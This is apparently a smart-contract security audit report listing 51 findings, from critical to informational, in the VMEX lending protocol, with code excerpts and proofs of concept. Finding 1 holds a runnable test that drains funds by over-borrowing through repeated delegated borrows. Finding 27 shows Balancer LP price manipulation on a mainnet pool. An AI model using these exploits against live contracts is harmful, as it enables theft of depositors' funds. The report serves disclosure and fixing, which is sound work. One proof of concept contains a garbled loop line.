1. Funds can be drained from the protocol Severity: Critical Difficulty: n/a Type: n/a Target: n/a Description: ValidationLogic.sol#L193. In the following POC, an attacker can borrow 100,000 USDC with 10 ETH of collateral with ETH being priced around 270 USD in the tests, that's about 2,700 USDC of collateral. You can run this test in your test suite. import { APPROVAL_AMOUNT_LENDING_POOL, } from "../../helpers/constants"; import { convertToCurrencyDecimals, convertToCurrencyUnits } from "../../helpers/contracts-helpers"; import { expect } from "chai"; import { ethers } from "ethers"; import { ProtocolErrors } from "../../helpers/types"; import { makeSuite, TestEnv } from "./helpers/make-suite"; import { CommonsConfig } from "../../markets/aave/commons"; import { getVariableDebtToken } from "../../helpers/contracts-getters"; const AAVE_REFERRAL = CommonsConfig.ProtocolGlobalParams.AaveReferral; makeSuite("Borrow exploit", (testEnv: TestEnv) => { it("exploit", async () => { const { users, pool, weth, usdc, oracle } = testEnv; var ethPrice = await oracle.getAssetPrice(weth.address) console.log("eth price: ", ethPrice) var usdcPrice = await oracle.getAssetPrice(usdc.address) console.log("usdc price: ", usdcPrice) var victims = users[0] var config = await pool.getReserveData(usdc.address, 0) var debtToken = await getVariableDebtToken(config[7]) // Seed 1M in the pool. await usdc .connect(victims.signer) .mint(await convertToCurrencyDecimals(usdc.address, "1000000")); await usdc .connect(victims.signer) .approve(pool.address, APPROVAL_AMOUNT_LENDING_POOL); await pool .connect(victims.signer) .deposit( usdc.address, 0, await convertToCurrencyDecimals(usdc.address, "1000000"), victims.address, "0" ); var attackerAddress0 = users[1] var attackerAddress1 = users[2] await weth .connect(attackerAddress0.signer) .mint(await convertToCurrencyDecimals(weth.address, "10")); await weth .connect(attackerAddress0.signer) .approve(pool.address, APPROVAL_AMOUNT_LENDING_POOL); await pool .connect(attackerAddress0.signer) .deposit( weth.address, 0, ethers.utils.parseEther("10"), attackerAddress0.address, "0" ); await weth .connect(attackerAddress1.signer) .mint(await convertToCurrencyDecimals(weth.address, "10")); await weth .connect(attackerAddress1.signer) .approve(pool.address, APPROVAL_AMOUNT_LENDING_POOL); await pool .connect(attackerAddress1.signer) .deposit( weth.address, 0, ethers.utils.parseEther("10"), attackerAddress1.address, "0" ); await debtToken .connect(attackerAddress1.signer) .approveDelegation(attackerAddress0.address, ethers.utils.parseEther("1")) for(var i=0; i<50;i++) { await pool .connect(attackerAddress0.signer) .borrow( usdc.address, 0, await convertToCurrencyDecimals(usdc.address, "2000"), AAVE_REFERRAL, attackerAddress1.address ); } var usdcBalance = await usdc.balanceOf(attackerAddress0.address) console.log("attacker balance: ", await convertToCurrencyUnits(usdc.address, usdcBalance.toString())) }); }); 
2. Tranche admin can DOS their tranche by setting treasury address to address(0) Severity: Critical Difficulty: n/a Type: n/a Target: n/a Description: Tranche admins can update their fee address via LendingPoolConfigurator.updateTreasuryAddress(), and there is no check to ensure that the address they set is not address(0). The function ReserveLogic.updateState() is called in nearly all of the protocol's critical functions, including deposit(), withdraw(), repay(), borrowHelper(), and liquidationCall(). The following (abridged) call sequence occurs whenever updateState() is performed: ReserveLogic.updateState() -> ReserveLogic._mintToTreasury() -> AToken.mintToTreasury() -> AToken._mint(): The AToken functions are below: function mintToTreasury(uint256 amount, uint256 index) external override onlyLendingPool { if (amount == 0) { return; } // get tranche admin's fee address from configurator address treasury = ILendingPoolConfigurator(_lendingPoolConfigurator).trancheAdminTreasuryAddresses(_tranche); _mint(treasury, amount.rayDiv(index)); ... } function _mint(address account, uint256 amount) internal virtual { require(account != address(0), "ERC20: mint to the zero address"); ... } The require statement in _mint() will cause the state update to revert if the recipient address is 0x0, preventing the protocol from functioning. Note that a global admin can recover the tranche from this state by setting the tranche's treasury address to a valid address (and likely removing the tranche admin). However, this is a manual process and requires the global admin to be aware of the issue and take action. To reproduce this issue, modify helpers/contract-deployment.ts to set treasuryAddress to "0x0000000000000000000000000000000000000000" at L237 and L623. Observe that many tests now revert with "ERC20: mint to the zero address". 
3. An attacker can DOS users deposits Severity: High Difficulty: n/a Type: n/a Target: n/a Description: When a user deposits for the first time an asset into a tranche, it will enable the usage as collateral. An attacker could distribute dust to target accounts with deposits to block the user from using it. It will prevent users from using the funds. 
4. Incorrect Curve oracle reentrancy protection Severity: High Difficulty: n/a Type: n/a Target: n/a Description: check_reentrancy(): bool success = false; (success,) = curve_pool.call(abi.encodeWithSignature("claim_admin_fees()")); if (!success) { (success,) = ICurvePool(curve_pool).owner().call(abi.encodeWithSignature("withdraw_admin_fees()")); require(success, Errors.VO_REENTRANCY_GUARD_FAIL); } It's a good practice to call to an address via wrapping it an interface instead of low level .call, as .call will always be successful on EOAs. For the Curve pools that don't implement claim_admin_fees() (example: DAI/USDC/USDT pool), withdraw_admin_fees() on owner (example: DAI/USDC/USDT pool's owner) is called. The correct function signature is withdraw_admin_fees(_pool: address). So it will always return false. Hence, if the call goes to the pool owner, it always reverts. This call also puts a lock on the owner contract instead of the pool because DAI/USDC/USDT pool doesn't have a lock on withdraw_admin_fees(). However, this pool is safe from this reentrancy attack as it doesn't use native token. Curve pools with native token have this reentrancy lock (example: ETH/stETH pool), however, older pools may not have this lock or this lock can be missed in error. 
5. Tranche admin can self-benefit at the expense of users Severity: High Difficulty: n/a Type: n/a Target: n/a Description: setReserveInterestRateStrategyAddress(), setReserveFactor() 
6. Incorrect order of arguments in calls to IncentivesController.handleAction() Severity: High Difficulty: n/a Type: n/a Target: n/a Description: IncentivizedERC20's _mint(), _burn() and _transfer() function calls to handleAction(address user, uint256 userBalance, uint256 totalSupply) incorrectly. Consider _transfer(): uint256 currentTotalSupply = _totalSupply; _getIncentivesController().handleAction(sender, currentTotalSupply, oldSenderBalance); if (sender != recipient) { _getIncentivesController().handleAction(recipient, currentTotalSupply, oldRecipientBalance); } Notice that currentTotalSupply and oldSenderBalance are swapped. 
7. No access control on setIncentivesController() Severity: High Difficulty: n/a Type: n/a Target: n/a Description: LendingPoolAddressesProvider.sol#L486 function setIncentivesController(address incentives) external override { _addresses[INCENTIVES_CONTROLLER] = incentives; emit IncentivesControllerUpdated(incentives); } 
8. User validation uses outdated protocol state Severity: High Difficulty: n/a Type: n/a Target: n/a Description: The validateBorrow() function is one of the most crucial functions for ensuring that users do not exceed their margin requirements when attempting to borrow funds. The implementation of this function is incorrect, as it uses outdated values to perform the margin check and updates the protocol state only after the validation has taken place. ValidationLogic.validateBorrow(...) reserve.updateState(...); Within the updateState() function both the interest earned and interest owed are updated. As the update process occurs after user input validation, any pending interest payments are ignored. 
9. Incorrect balancer LP price decimals Severity: High Difficulty: n/a Type: n/a Target: n/a Description: In BalancerOracle.calc_balancer_lp_price() the price is calculated as: return ((fairResA * pxA) + (fairResB * pxB)) / supply; Assume that the pool weights are (0.5, 0.5). Then the price decimals are: (dA + dB)/2 - BPT_decimals + oracle_decimals = (dA + dB)/2 - 18 + 8 Where dA and dB are the decimals of tokens A and B respectively. This is correct only if dA + dB = 36. For example if tokens A and B have both 18 decimals then the LP price will have 8 decimals as the oracle, which is correct. computeFairReserves() is commented in the following with the decimals for each variable, showing that fair reserves have (dA + dB)/2 decimals function computeFairReserves( ... uint r0 = BNum.bdiv(resA, resB); // @audit dA - dB + 18 uint r1 = BNum.bdiv(BNum.bmul(wA, pxB), BNum.bmul(wB, pxA)); // @audit 18 // fairResA = resA * (r1 / r0) ^ wB // fairResB = resB * (r0 / r1) ^ wA if (r0 > r1) { uint ratio = BNum.bdiv(r1, r0); // @audit 18 - (dA - dB + 18) + 18 = dB - dA + 18 fairResA = BNum.bmul(resA, BNum.bpow(ratio, wB)); // @audit dA + ((dB - dA + 18 - 18)/2 + 18) - 18 = (dB + dA)/2 fairResB = BNum.bdiv(resB, BNum.bpow(ratio, wA)); // @audit dB - ((dB - dA + 18 - 18)/2 + 18) + 18 = (dB + dA)/2 } else { uint ratio = BNum.bdiv(r0, r1); // @audit dA + 18 - dB fairResA = BNum.bdiv(resA, BNum.bpow(ratio, wB)); // @audit dA - ((dA + 18 - dB - 18)/2 + 18) + 18 = (dB + dA)/2 fairResB = BNum.bmul(resB, BNum.bpow(ratio, wA)); // @audit dB + ((dA + 18 - dB - 18)/2 + 18) - 18 = (dB + dA)/2 } } Note also that, again because resA and resB have the respective tokens decimals, the ratio can be much smaller than 18. This will cause rounding errors in BNum.bpow(ratio, wB) as discussed in a separate finding. 
10. Excessive timeframe could lead to stale Chainlink oracle prices Severity: Medium Difficulty: n/a Type: n/a Target: n/a Description: The getOracleAssetPrice() function uses Chainlink price feed's latestRoundData() function in order to obtain a price for the asset. latestRoundData() also returns updatedAt which is the timestamp at which the price was reported to Chainlink. A time duration threshold can be used against updatedAt to either accept or reject the price. VMEX does this, and allows a maximum timeframe of SECONDS_PER_DAY in order to consider the price not stale: function getOracleAssetPrice(address asset) internal returns (uint256){ ... ( /* uint80 roundID */, int256 price, /*uint startedAt*/, uint256 updatedAt, /*uint80 answeredInRound*/ ) = IChainlinkPriceFeed(source).latestRoundData(); IChainlinkAggregator aggregator = IChainlinkAggregator(IChainlinkPriceFeed(source).aggregator()); if (price > int256(aggregator.minAnswer()) && price < int256(aggregator.maxAnswer()) && block.timestamp - updatedAt < SECONDS_PER_DAY) { return uint256(price); } ... } 1 day is a good enough check for stablecoins but volatile assets, Chainlink has a much shorter price refresh period (called heartbeat). For example, LINK/USD oracle on Optimism has a heartbeat of 1200 seconds. Hence, despite this check, Vmex will continue accepting a stale price if Chainlink fails to report it within the shorter heartbeat. 
11. Velo LP price can be manipulated to liquidate Severity: Medium Difficulty: n/a Type: n/a Target: n/a Description: The initial state of the LP: weth/USDC pair: `0x79c912FEF520be002c2B6e57EC4324e260f38E50` Total supply = 112602391366085351 reserveA uint256 : 4908868931818 * 10**18 / 10**6 (USDC) reserveB uint256 : 2583875906785643384998 * 10**18 / 10**18 (WETH) sqrt(4.9088689e+24 * 2583875906785643384998) = 1.1262286e+23 prices: USDC = 100000000 WETH = 191007000000 sqrt(100000000 * 191007000000) = 4370434760 LP price = 2 * 1.1262286e+23 * 4370434760 / 112602391366085351 = 8.7424584e+15 So we have an LP price of 87,424,584 USD The attacker proceeds to take a loan and swaps 50,000 WETH for USDC. weth/USDC pair: `0x79c912FEF520be002c2B6e57EC4324e260f38E50` Total supply = 112602391366085351 (unchanged)/ reserveA uint256 : (4908868931818 - 4695363000000) * 10**18 / 10**6 (USDC) reserveB uint256 : (2583875906785643384998 + 50000 * 10**18) * 10**18 / 10**18 (WETH) sqrt(5.2583876e+22 * 2.1350593e+23) = 1.0595739e+23 prices: USDC = 100000000 WETH = 191007000000 sqrt(100000000 * 191007000000) = 4370434760 LP price = 2 * 1.0595739e+23 * 4370434760 / 112602391366085351 = 8.2250449e+15 So we have an LP price of 82,250,448 USD In this example, the LP price has now decreased by 6%. The attacker must liquidate accounts, requiring around 50 ETH to cover the swap cost for this particular pool. However, this amount can vary significantly based on the pool's liquidity. 
12. borrowFactor can be less than 100% Severity: Medium Difficulty: n/a Type: n/a Target: n/a Description: setBorrowingEnabled() validateCollateralParams() 
13. Usage of transferFrom() instead of safeTransferFrom() Severity: Medium Difficulty: n/a Type: n/a Target: n/a Description: This issue can be found here: IncentivesController.sol#L159, IncentivesController.sol#L193 
14. Oracle pricing for stable coins LP will trigger liquidation earlier than expected Severity: Medium Difficulty: n/a Type: n/a Target: n/a Description: With a stable coin unpeg, on the LP pools, the price of the entire assets used to price the pool is the lowest of the three assets in the pool. In case of a USDC-USDT pool properly balanced 50-50 if one of the assets unpeg to 0.9 a user that has deposited 100 USD worth of assets prior to unpeg will have his deposits valued at 90 USD instead of 95 USD reducing his collateral value and resulting in a potential liquidation/loss./ This pattern can be found in the following two oracles: BalancerOracle.sol#L139 CurveOracle.sol#L36 
15. Blacklist/Whitelist does not behave as expected and tranche admins can block all transfers Severity: Medium Difficulty: n/a Type: n/a Target: n/a Description: AToken._transfer() calls LendingPool.finalizeTransfer() which internally calls checkWhitelistBlacklist() to check if both the msg.sender and the token receiver are whitelisted/blacklisted for the respective tranche. In the context of this call however, msg.sender is the aToken contract, rather than the transfer's from address. Accordingly, even if a token sender is blacklisted (or non-whitelisted), they will still be able to transfer their tokens to a new address as the from address is never checked. Afterwards, the receiving address will be able to freely interact with the protocol (in the blacklist case; if the new address is not on the whitelist they will still be blocked from deposit/borrowing). Similarly, a tranche admin can block all aToken transfers for their tranche by either: Adding the aToken's address to the blacklist Enabling the whitelist Note that even if a tranche admin blocks transfers, users will still be able to withdraw their funds directly from the system. However, if they are using their aTokens with a different protocol (e.g. depositing them in yield farm or using them as collateral for a loan elsewhere), they will not be able to remove their tokens from the outside protocol to withdraw from VMEX. LendingPool.sol (_checkWhitelistBlacklist(), finalizeTransfer()): // @audit "user" is always either msg.sender or "to" address; never the token transfer's "from". function _checkWhitelistBlacklist(uint64 trancheId, address user) internal view { if (trancheParams[trancheId].isUsingWhitelist) { require( _usersConfig[user][trancheId].configuration.getWhitelist(), Errors.LP_NOT_WHITELISTED_TRANCHE_PARTICIPANT ); } require(!_usersConfig[user][trancheId].configuration.getBlacklist(), Errors.LP_BLACKLISTED_TRANCHE_PARTICIPANT); } function checkWhitelistBlacklist(uint64 trancheId, address onBehalfOf) internal view { _checkWhitelistBlacklist(trancheId, msg.sender); if (onBehalfOf != msg.sender) { _checkWhitelistBlacklist(trancheId, onBehalfOf); } } ... // @audit this is called from the aToken contract in AToken._transfer() function finalizeTransfer( address asset, uint64 trancheId, address from, address to, uint256 amount, uint256 balanceFromBefore, uint256 balanceToBefore ) external override whenTrancheNotPausedAndExists(trancheId) { require(msg.sender == _reserves[asset][trancheId].aTokenAddress, Errors.LP_CALLER_MUST_BE_AN_ATOKEN); // @audit The "from" address is not passed to this check. By blacklisted (or not whitelisting) // the aToken address, a tranche admin can cause this to always revert. checkWhitelistBlacklist(trancheId, to); ... } AToken._transfer(): function _transfer(address from, address to, uint256 amount, bool validate) internal { address underlyingAsset = _underlyingAsset; ILendingPool pool = _pool; ... // @audit "validate" is true for standard transfer() and transferFrom() calls; not on liquidations if (validate) { pool.finalizeTransfer( underlyingAsset, _tranche, from, to, amount, fromBalanceBefore, toBalanceBefore ); } 
16. nthroot() should use established libraries for calculating roots Severity: Low Difficulty: n/a Type: n/a Target: n/a Description: nthroot(): function nthroot(uint8 n, uint256 _product) internal pure returns (uint256) { //VMEX empirically checked that this is only accurate for square roots and cube roots, // and the decimals are 9 and 12 respectively if (n == 2) { return LogExpMath.pow(_product, 1e18 / n) / 1e9; } if (n == 3) { return LogExpMath.pow(_product, 1e18 / n) / 1e12; } revert("Balancer math only can handle square roots and cube roots"); } nthroot() also reverts for high values like 57896044618658097711785492504343953926634992332820282019728792003956564819968. It should not be achievable but the alternatives accommodate these values too. 
17. Protocol should only choose a single asset denomination for all tranches Severity: Low Difficulty: n/a Type: n/a Target: n/a Description: On ETH mainnet, you can have prices denominated in ETH or USD value. see: https://data.chain.link/ethereum/mainnet/crypto-eth and https://data.chain.link/ethereum/mainnet/crypto-usd VMEXOracle.sol#L96 
18. Asset mapping might not be set and should be checked to be non-zero Severity: Low Difficulty: n/a Type: n/a Target: n/a Description: LendingPool.sol#L109 
19. finalizeTransfer() and liquidationCall() auto-enables collateral for receiver Severity: Low Difficulty: n/a Type: n/a Target: n/a Description: DepositWithdrawLogic.sol#L80 does this if the asset is enabled as collateral in reserve data: if (isFirstDeposit) { // if collateral is enabled, by default the user's deposit is marked as collateral user.setUsingAsCollateral(self.id, self.configuration.getCollateralEnabled(vars.asset, vars._assetMappings)); } LendingPool.sol#L645 and LendingPoolCollateralManager.sol#L237-L239 always sets it to true: if (balanceToBefore == 0 && amount != 0) { DataTypes.UserConfigurationMap storage toConfig = _usersConfig[to][trancheId].configuration; toConfig.setUsingAsCollateral(reserveId, true); emit ReserveUsedAsCollateralEnabled(asset, trancheId, to); } liquidatorConfig.setUsingAsCollateral( collateralReserve.id, true ); This can be made consistent to always use getCollateralEnabled() so that an invalid state never enters the protocol. 
20. Remove the special treatment of type(uint256).max in validateBorrow() Severity: Low Difficulty: n/a Type: n/a Target: n/a Description: ValidationLogic.sol#L176-L202 
21. Check if asset has been added before setting its parameters Severity: Low Difficulty: n/a Type: n/a Target: n/a Description: setVMEXReserveFactor() and setBorrowingEnabled() don't validate that the asset has already been added. 
22. Use OZ SafeCast Severity: Low Difficulty: n/a Type: n/a Target: n/a Description: AssetMappings.sol#L275-L278 can silently overflow uint64's max value. 
23. registerAddressesProvider() doesn't check if a provider is already registered Severity: Low Difficulty: n/a Type: n/a Target: n/a Description: If registerAddressesProvider() can be called twice on the same provider with different ids. The second call will overwrite _addressesProviders[provider]. 
24. checkAmount() can overflow Severity: Low Difficulty: n/a Type: n/a Target: n/a Description: checkAmount() uses unchecked to verify if requested borrow amount does not breach borrowCap: unchecked { require( totalDebt + amount <= borrowCap * 10**decimals, Errors.VL_BORROW_CAP_EXCEEDED ); } RHS will work as borrowCap will be set such that it's not possible to overflow unless you set it really high which will be an error on the part of the global admin. In general, unless you have a proof that this won't overflow or if the overflow is desired, then only unchecked should be used. 
25. Use abi.encodeCall instead of abi.encodeWithSelector Severity: Low Difficulty: n/a Type: n/a Target: n/a Description: New aTokens are deployed as follows: address aTokenProxyAddress = _initTokenWithProxy( addressesProvider.getATokenBeacon(), abi.encodeWithSelector( IInitializableAToken.initialize.selector, cachedPool, address(this), //lendingPoolConfigurator address address(addressesProvider), // input.underlyingAsset, trancheId ) ); Here is the function signature of AToken.initialize(): function initialize( ILendingPool pool, InitializeTreasuryVars memory vars ) external override initializer { 
26. setAssetAllowed(asset, false) logic allows DoS attack Severity: Low Difficulty: n/a Type: n/a Target: n/a Description: If setPermissionlessTranches(true) is called, claimTrancheId() can be called by anyone, therefore creating a new tranche. In the method setAssetAllowed(), if isAllowed == false, the check validateAssetAllowed() will be run: function setAssetAllowed(address asset, bool isAllowed) external onlyGlobalAdmin{ ... if (!isAllowed) { validateAssetAllowed(asset); } ... } function validateAssetAllowed(address asset) internal view { ... for (uint64 tranche = 0; tranche < totalTranches; tranche++) { ... } } Each iteration will cost some gas, if there are too many tranches whether it is under a normal scenario or an attack, this function will use too much gas and will not be callable creating a DoS. 
27. Balancer LP fair price can be manipulated for illiquid pools Severity: Low Difficulty: n/a Type: n/a Target: n/a Description: The BNum.bpow() function returns accurate values down to 1e-6 (1e12 in wei). Below that, the result is larger than expected. Here is a code snippet that shows this: function testBpow() public { uint exp = 0.5*1e18; uint bpowRes; uint expectedRes; uint base; uint ratio; for (uint i=0; i<=18; i+=2) { base = 10**i; bpowRes = BNum.bpow(base, exp); expectedRes = 10**(i/2 + 9); ratio = bpowRes/expectedRes; console.log("- (1e%d)^0.5 bpow/expected: %d", i, ratio); } } which will print: Logs: - (1e0)^0.5 bpow/expected: 399293 - (1e2)^0.5 bpow/expected: 39929 - (1e4)^0.5 bpow/expected: 3992 - (1e6)^0.5 bpow/expected: 399 - (1e8)^0.5 bpow/expected: 39 - (1e10)^0.5 bpow/expected: 4 - (1e16)^0.5 bpow/expected: 1 - (1e18)^0.5 bpow/expected: 1 In BalancerOracle.computeFairReserves() the ratio variable is around 1e18 for balanced pools (NOTE: This is only true when the pool tokens have 18 decimals, but decimals are discussed in another finding and the related fix will make it true for all tokens). If a pool has low liquidity then it is possible to swap a large amount to make it unbalanced and manipulate the fair price. Note that in order to impact the fair price the reserve ratio must become 1e-6 or less (1e12 in wei), meaning that an attacker should have to swap an amount of at least 1000 times the current pool reserves. Also, multiple swaps must be performed to bypass Balancer's check on maximum swapped amount making the manipulation gas expensive. For these reasons, it seems unlikely that an attacker can manipulate the LP collateral price profitably. Here is a PoC of the manipulation on the ETH-UNI Mainnet pool: function testManip() public { address pool = 0x5Aa90c7362ea46b3cbFBD7F01EA5Ca69C98Fef1c; //UNI-ETH pool on mainnet uint UNI_price = 5.15*1e8; // UNI-USDC chainlink price uint ETH_price = 1800*1e8; // ETH-USDC chainlink price console.log("Mainnet block:", block.number); uint256[] memory prices = new uint256[](2); prices[0] = UNI_price; prices[1] = ETH_price; // direct LP price calculation bytes32 pool_id = IBalancer(pool).getPoolId(); IVault balancer_vault = IBalancer(pool).getVault(); (IERC20[] memory tokens, uint256[] memory balances, ) = balancer_vault.getPoolTokens(pool_id); uint totPoolUSDCvalue = UNI_price*balances[0]/1e18 + ETH_price*balances[1]/1e18; uint LPprice = totPoolUSDCvalue*(10**IBalancer(pool).decimals())/IBalancer(pool).totalSupply(); console.log("LP expected price:", LPprice); // use Balancer Oracle to get LP price uint LPoraclePrice = BalancerOracle.get_lp_price(pool, prices, 0, true); console.log("LP oracle price before manipulation:", LPoraclePrice); // Swap 100_000 ETH on pool uint amount = 1e5*1e18; vm.deal(address(this), amount); IWETH9(address(tokens[1])).deposit{value:1e5*1e18}(); IWETH9(address(tokens[1])).approve(address(balancer_vault), amount); // 1. Swap WETH for UNI FundManagement memory funds = FundManagement( { sender: address(this), fromInternalBalance: false, recipient: payable(address(this)), toInternalBalance: false } ); bytes memory userData; SingleSwap memory singleSwap = SingleSwap( { poolId: pool_id, kind: SwapKind(0), assetIn: address(tokens[1]), assetOut: address(tokens[0]), amount: amount, userData: userData } ); while (true) { // do multiple swaps because balancer limit swap amount to 30% of reserves (, balances, ) = balancer_vault.getPoolTokens(pool_id); amount = balances[1]*3/10; // maximum that can be swapped due to balancer limits if (IWETH9(address(tokens[1])).balanceOf(address(this)) < amount) break; singleSwap.amount = amount; IBalancerVault(address(balancer_vault)).swap(singleSwap, funds, 0, block.timestamp + 1); } LPoraclePrice = BalancerOracle.get_lp_price(pool, prices, 0, true); console.log("LP oracle price after manipulation:", LPoraclePrice); } which will print: Logs: Mainnet block: 17251326 LP expected price: 9752931061 LP oracle price before manipulation: 9752695445 LP oracle price after manipulation: 91173235346 The full PoC is available here: https://gist.github.com/bahurum/67ef6ea9ea820108844b320c977a3c34 
28. Fetching the decimals is only required once Severity: Gas Difficulty: n/a Type: n/a Target: n/a Description: DistributionManager.sol#L53 
29. Price oracle is fetched on every iteration of the loop Severity: Gas Difficulty: n/a Type: n/a Target: n/a Description: GenericLogic.sol#L220 
30. oracle is retrieved twice in LendingPoolCollateralManager's _calculateAvailableCollateralToLiquidate() Severity: Gas Difficulty: n/a Type: n/a Target: n/a Description: The oracle is retrieved twice to calculate the debtAssetPrice and collateralPrice 
31. onlyLendingPoolConfigurator in aToken is unused Severity: Gas Difficulty: n/a Type: n/a Target: n/a Description: onlyLendingPoolConfigurator in aToken is unused. 
32. Cache storage variable outside loop Severity: Gas Difficulty: n/a Type: n/a Target: n/a Description: LendingPool.sol#L576: address[] memory _activeReserves = new address[]( trancheParams[trancheId].reservesCount ); for (uint256 i = 0; i < trancheParams[trancheId].reservesCount; i++) { _activeReserves[i] = _reservesList[trancheId][i]; } Here trancheParams[trancheId].reservesCount is read multiple times. 
33. Redundant checks on Chainlink oracle Severity: Gas Difficulty: n/a Type: n/a Target: n/a Description: getOracleAssetPrice() validates the price as follows: if (price > int256(aggregator.minAnswer()) && price < int256(aggregator.maxAnswer()) && block.timestamp - updatedAt < SECONDS_PER_DAY) { return uint256(price); } else { return _fallbackOracle.getAssetPrice(asset); } As explained about price > int256(aggregator.minAnswer()) && price < int256(aggregator.maxAnswer()) is always true. 
34. addressesProvider.getLendingPool() can be cached outside of the loop Severity: Gas Difficulty: n/a Type: n/a Target: n/a Description: AssetMappings.sol#L67 
35. private variable _addressesTranche is unnecessarily nested Severity: Gas Difficulty: n/a Type: n/a Target: n/a Description: _addressesTranche is defined as mapping(bytes32 => mapping(uint64 => address)) private _addressesTranche; This variable is only used to store the admin address for a tranche. _addressesTranche is accessed in several functions setTrancheAdmin(), addTrancheAdmin() and getAddressTranche() which is itself called by the onlyTrancheAdmin(). 
36. Ensure that the borrowCap and supplyCap doesn't include decimals Severity: Informational Difficulty: n/a Type: n/a Target: n/a Description: borrowCap is assumed to not have decimals in it as indicated by its usage ValidationLogic.sol#L145: require( totalDebt + amount <= borrowCap * 10**decimals, Errors.VL_BORROW_CAP_EXCEEDED ); That's the case with supplyCap too: require( supplyCap == 0 || (IAToken(reserve.aTokenAddress).totalSupply() + amount) <= supplyCap * (10**_assetMappings.getDecimals(asset)), Errors.VL_SUPPLY_CAP_EXCEEDED ); Hence, global admin has to make sure that borrowCap and supplyCap does not include the decimals. Otherwise, an absurdly high amount can be borrowed or lent. 
37. Rewards can be greater than REWARDS_VAULT balance Severity: Informational Difficulty: n/a Type: n/a Target: n/a Description: IncentivesController.sol#L159 
38. Two instances of DistributionTypes.sol Severity: Informational Difficulty: n/a Type: n/a Target: n/a Description: math/DistributionTypes.sol types/DistributionTypes.sol 
39. Incorrect Natpsec for getRewardsData() Severity: Informational Difficulty: n/a Type: n/a Target: n/a Description: The last return parameter of getRewardsData() is incorrect. 
40. Be cautious when integrating an ERC20 token Severity: Informational Difficulty: n/a Type: n/a Target: n/a Description: Before integrating a token with Vmex protocol, make sure to do a careful review of the token. You can take a look at past hacks that have happened due to non-standard token impelmenetation: weird-erc20. 
41. Extra comment in ValidationLogic's validateTransfer() function Severity: Informational Difficulty: n/a Type: n/a Target: n/a Description: This commented out code can be removed. 
42. On-Chain price manipulation Severity: Informational Difficulty: n/a Type: n/a Target: n/a Description: 
43. AToken initialize is missing a space on aTokenName Severity: Informational Difficulty: n/a Type: n/a Target: n/a Description: AToken.sol#L106 
44. Not used imports Severity: Informational Difficulty: n/a Type: n/a Target: n/a Description: DefaultReserveInterestRateStrategy.sol#L8 
45. Natspec of setBorrowingEnabled() is wrong Severity: Informational Difficulty: n/a Type: n/a Target: n/a Description: AssetMappings.sol#L130 
46. A user can be both whitelisted and blacklisted Severity: Informational Difficulty: n/a Type: n/a Target: n/a Description: LendingPool.sol#L83 UserConfiguration.sol#L130 UserConfiguration.sol#L157 
47. Limiting Incentives to Prevent Gas Shortages in Incentivized Assets Severity: Informational Difficulty: n/a Type: n/a Target: n/a Description: DistributionManager.sol#L130 
48. Document missing call to aToken.handleRepayment() Severity: Informational Difficulty: n/a Type: n/a Target: n/a Description: Aave V2's repay() calls handleRepayment() on the corresponding aToken: IERC20(asset).safeTransferFrom(msg.sender, aToken, paybackAmount); IAToken(aToken).handleRepayment(msg.sender, paybackAmount); <-- // missing from Vmex emit Repay(asset, onBehalfOf, msg.sender, paybackAmount); Here is the corresponding Vmex's repay(): IERC20(asset).safeTransferFrom(msg.sender, reserve.aTokenAddress, paybackAmount); emit Repay(asset, trancheId, onBehalfOf, msg.sender, paybackAmount); However, handleRepayment() is a noop as it calls to an empty function, so it doesn't affect the functionality. 
49. Incomplete Natspec for calculateUserAccountData() Severity: Informational Difficulty: n/a Type: n/a Target: n/a Description: GenericLogic.sol#L179 
50. Incorrect comment in PercentMath.sol Severity: Informational Difficulty: n/a Type: n/a Target: n/a Description: PercentageMath.sol#L21 
51. Oracle updates bricked for Beethoven boosted pools Severity: Informational Difficulty: n/a Type: n/a Target: n/a Description: VMEXOracle.getBeethovenPrice(), when dealing with boosted pools, checks whether the first address in the boosted poolâ€™s token list is the address of the pool itself, which is the case for some boosted pools (e.g.: pool 0x6222ae1d2a9f6894dA50aA25Cb7b303497f9BEbd, as can be seen in the following screenshot). PoC pragma solidity 0.8.19; import "forge-std/Test.sol"; import "forge-std/console.sol"; interface Vault { function getPoolTokens(bytes32) external view returns(IERC20[] memory tokens, uint256[] memory balances, uint256); } interface IBalancer { function getPoolId() external returns (bytes32 poolID); } interface IERC20 {} Vault constant vault = Vault(0xBA12222222228d8Ba445958a75a0704d566BF2C8); address constant ETH_NATIVE = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE; address constant WETH = 0x4200000000000000000000000000000000000006; contract PoC is Test { address[3] assets = [ 0xb1C9aC57594e9B1EC0f3787D9f6744EF4CB0A024, 0xde45F101250f2ca1c0f8adFC172576d10c12072D, 0x6222ae1d2a9f6894dA50aA25Cb7b303497f9BEbd ]; VmexStub vmex; function setUp() external { vm.createSelectFork("https://endpoints.omniatech.io/v1/op/mainnet/public"); vmex = new VmexStub(); } function test_IndexOutOfBoundsPoC() external { vm.expectRevert(); vmex.getAssetPrice(assets[2]); } } contract VmexStub { address[3] assets = [ 0xb1C9aC57594e9B1EC0f3787D9f6744EF4CB0A024, 0xde45F101250f2ca1c0f8adFC172576d10c12072D, 0x6222ae1d2a9f6894dA50aA25Cb7b303497f9BEbd ]; function getBeethovenPriceStub(address asset) internal returns(uint256) { bytes32 poolId = IBalancer(asset).getPoolId(); ( IERC20[] memory tokens, , ) = vault.getPoolTokens(poolId); uint256 i = 0; if(address(tokens[0]) == asset) { //boosted tokens first token is itself i = 1; } uint256[] memory prices = new uint256[](tokens.length-i); while(i 0); i++; } // ... return prices[0]; } function getAssetPrice(address asset) public returns(uint256) { if (assets[0] != asset && assets[1] != asset && assets[2] != asset) { // if asset is a base type return mock price return 0x01; } else { // else we're managing a beethoven lp return getBeethovenPriceStub(asset); } } } If this condition holds, the function attempts to skip over the first token of the list by setting an index variable i = 1. The issue with this is that right after, the prices array is initialized as uint256[] memory prices = new uint256[](tokens.length - 1) and then a loop is performed while i < tokens.length: within the loop body, the code retrieves stores prices[i] = getAssetPrice(). At the final iteration, when i = tokens.length - 1, the write to prices[tokens.length - 1] will fail with an Index out of bounds exception. 
